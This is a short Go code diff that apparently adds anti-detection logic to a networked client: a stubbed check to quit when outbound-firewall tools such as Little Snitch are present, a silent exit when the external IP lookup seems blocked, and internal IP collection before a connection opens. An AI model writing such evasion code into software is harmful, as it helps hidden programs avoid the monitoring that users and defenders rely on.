@@ -45,6 +45,17 @@ func main() {
 
 	system := InitSystem()
 
+	// Is it OK to run on this machine?
+	if false { // Fill in check for little snitch, etc.
+		os.Exit(0)
+	}
+
+	if _, err := system.GetExternalIP(true); err != nil {
+		// Getting blocked?
+		os.Exit(0)
+	}
+	system.GetInternalIP()
+
 	connection := shared.InitConnection()
 
 	defer connection.Close()
